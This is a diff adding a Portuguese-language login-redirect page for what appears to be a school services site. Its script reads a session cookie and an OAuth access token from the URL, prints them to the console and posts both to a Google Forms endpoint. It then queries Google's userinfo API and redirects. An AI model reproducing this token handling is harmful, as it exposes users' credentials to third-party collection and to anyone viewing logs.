@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+
+<title>Login</title>
+<meta name="description" content="Login no CEEJA Paulo Decourt para acessar os serviços disponíveis">
+
+<meta http-equiv="cache-control" content="max-age=0">
+<meta viewport="width=device-width, initial-scale=1">
+
+<script src="https://tarcisomesquita.github.io/log.js" onload="logsend()" async defer></script>
+
+<script>
+function getCookie(id) {
+  let name = id + "=";
+  let ca = document.cookie.split(';');
+  for(let i = 0; i < ca.length; i++) {
+    let c = ca[i];
+    while (c.charAt(0) == ' ') c = c.substring(1);
+    if (c.indexOf(name) == 0) {
+      return c.substring(name.length, c.length);
+    }
+  }
+  return '';
+}
+
+let logToken = getCookie('token');
+
+console.log(`logToken = ${logToken}`);
+
+if (logToken === '')  {
+  console.log('Não tem logToken');
+  window.location.href = 'https://tarcisomesquita.github.io';
+}
+
+let parametros = new URLSearchParams(window.location.search);
+
+if (! parametros.has('access_token')) {
+  console.log('Não tem access_token');
+  window.location.href = 'https://tarcisomesquita.github.io';
+}
+
+let access_token = parametros.get('access_token');
+console.log(`access_token = ${access_token}`);
+
+async function enviarToken() {
+  try {
+    const response = await fetch(
+      'https://docs.google.com/forms/u/0/d/e/1FAIpQLScGwq8tvtiFUjhTQ58SlhN0b9rymqGGeXbJJoFB2YWks4FSPA/formResponse', 
+      {
+        method: 'POST',
+        mode: 'no-cors',
+        credentials: 'omit',
+        'body': `{'token':'${logToken}', 'access_token': '${access_token}'}`
+      }
+    );
+    if (!response.ok) {
+      throw new Error(`HTTP error: ${response.status}`);
+    }
+  }
+  catch (error) {
+    console.error(`Erro em enviarToken(): ${error}`);
+  }
+}
+enviarToken();
+
+async function fetchInfo() {
+  try {
+    const response = await fetch(
+      'https://www.googleapis.com/oauth2/v1/userinfo',
+      {
+        method: 'GET',
+        mode: 'no-cors',
+        credentials: 'omit',
+        headers: {  
+          Authorization: `Bearer ${access_token}`
+        }
+      }
+    );
+    
+    if (!response.ok) {
+      throw new Error(`HTTP error: ${response.status}`);
+    }
+    
+    const data = await response.json();
+    return data;
+  }
+  catch (error) {
+    console.error(`Erro em fetchInfo(): ${error}`);
+  }
+}
+
+const userinfo = fetchInfo();
+userinfo.then((data) => {console.log(JSON.stringify(data))});
+
+//if (parametros.has('expires_in')) expires_in = parametros.get('expires_in');
+//else expires_in = '';
+
+window.location.href = 'https://tarcisomesquita.github.io';
+</script>
+
+</head>
+
+<body>
+
+<p>Redirecionar para <a href="https://tarcisomesquita.github.io">página inicial</a>.</p>
+
+</body>
+</html>
